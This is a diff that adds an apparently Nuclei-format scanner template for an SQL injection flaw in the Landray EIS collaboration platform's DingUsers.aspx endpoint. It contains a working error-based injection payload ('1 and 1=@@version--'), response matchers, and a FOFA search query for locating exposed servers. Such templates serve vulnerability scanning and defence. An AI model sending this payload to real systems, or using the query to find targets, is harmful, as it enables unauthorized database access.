@@ -1,0 +1,30 @@
+http:
+    - headers:
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.1743.70 Safari/537.36
+      matchers:
+        - part: body
+          type: word
+          words:
+            - Microsoft SQL Server
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      method: GET
+      path:
+        - '{{BaseURL}}/SM/DingUsers.aspx?id=1+and+1=@@version--'
+id: landray-eis-dingusers-sqli
+info:
+    author: onewin
+    description: |
+        蓝凌EIS智慧协同平台的/SM/DingUsers.aspx接口存在SQL注入漏洞，可获取数据库版本信息
+        [漏洞发现时间：2025年7月]
+    metadata:
+        fofa-query: body="/scripts/jquery.landray.common.js" || title="蓝凌EIS"
+    name: 蓝凌EIS智慧协同平台 DingUsers.aspx SQL注入漏洞
+    severity: high
+    tags:
+        - LandRay-OA
+        - 蓝凌EIS智慧协同平台
+        - jQuery
+        - 蓝凌eis智慧协同平台
